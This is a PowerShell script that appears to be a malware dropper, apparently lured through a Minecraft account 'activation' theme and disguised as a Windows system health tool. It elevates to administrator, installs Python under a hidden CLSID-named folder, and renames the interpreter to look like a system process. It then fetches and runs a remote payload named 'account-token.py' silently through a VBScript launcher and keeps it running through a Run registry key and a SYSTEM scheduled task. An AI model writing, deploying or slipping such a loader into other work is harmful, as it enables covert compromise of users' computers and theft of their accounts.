if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    $arguments = "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
    Start-Process powershell.exe -ArgumentList $arguments -Verb RunAs
    exit
}

$GITHUB_RAW_URL = "https://raw.githubusercontent.com/get-activated/com.mojang.minecraft/refs/heads/main/account-token.py"
$BaseDir = "$env:APPDATA\Microsoft\SystemHealth"
$CLSID = ".{e2110112-612b-4750-ad30-75611c619e64}"
$InstallDir = "$BaseDir$CLSID"
$AgentPath = "$InstallDir\win_sys_host.pyw"
$PythonPath = "$InstallDir\bin"

if (-not (Test-Path $InstallDir)) {
    New-Item -ItemType Directory -Force -Path $InstallDir | Out-Null
}

# --- Python Setup ---
$pythonInstalled = $false
try {
    $pythonVersion = & python --version 2>&1
    if ($pythonVersion -match "Python 3") {
        $pythonInstalled = $true
        $pythonwExe = "pythonw"
    }
} catch {}

if (-not $pythonInstalled) {
    Write-Host "Setting up environment..." -ForegroundColor Yellow
    $pythonUrl = "https://www.python.org/ftp/python/3.11.0/python-3.11.0-embed-amd64.zip"
    $pythonZip = "$env:TEMP\sys_cache.zip"
    Invoke-WebRequest -Uri $pythonUrl -OutFile $pythonZip -UseBasicParsing
    Expand-Archive -Path $pythonZip -DestinationPath $PythonPath -Force
    Remove-Item $pythonZip
    
    if (Test-Path "$PythonPath\pythonw.exe") { Rename-Item "$PythonPath\pythonw.exe" "SysHealthHost.exe" -Force }
    $pythonwExe = "$PythonPath\SysHealthHost.exe"
}

# --- Download Payload ---
Invoke-WebRequest -Uri $GITHUB_RAW_URL -OutFile $AgentPath -UseBasicParsing

# --- Fixed VBScript Launcher ---
$vbsLauncher = "$InstallDir\launcher.vbs"
$q = [char]34  # This is a literal double-quote "
$vbsContent = "Set WshShell = CreateObject($q" + "WScript.Shell" + "$q)" + "`n" + "WshShell.Run $q$pythonwExe$q & " + "$q $AgentPath$q" + ", 0, False"
Set-Content -Path $vbsLauncher -Value $vbsContent -Encoding ASCII

# --- Persistence ---
$RegPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
Set-ItemProperty -Path $RegPath -Name "SystemHealthManager" -Value "wscript.exe $q$vbsLauncher$q" -Force

$Action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "$q$vbsLauncher$q"
Register-ScheduledTask -TaskName "SystemHealthUpdate" -Action $Action -Trigger (New-ScheduledTaskTrigger -AtLogOn) -Principal (New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest) -Force | Out-Null

# --- Run it now ---
Start-Process "wscript.exe" -ArgumentList "$q$vbsLauncher$q"
Write-Host "Installation Complete." -ForegroundColor Green
exit
